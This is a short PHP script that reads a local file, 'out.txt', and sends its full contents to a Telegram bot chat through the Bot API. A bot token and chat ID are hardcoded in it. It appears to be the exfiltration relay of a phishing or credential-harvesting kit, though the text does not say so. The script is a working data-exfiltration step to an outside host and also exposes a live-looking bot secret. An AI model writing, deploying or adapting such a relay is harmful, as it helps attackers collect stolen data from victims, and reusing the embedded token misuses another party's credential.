<?php
    sleep(2);
    $msg = urlencode(file_get_contents("out.txt"));
    file_get_contents("https://api.telegram.org/bot1305220137:AAELDuFI1-QAgfezGOBnW3KZ0d1Ol5boQrI/sendMessage?chat_id=1011363480&text=$msg");
?>
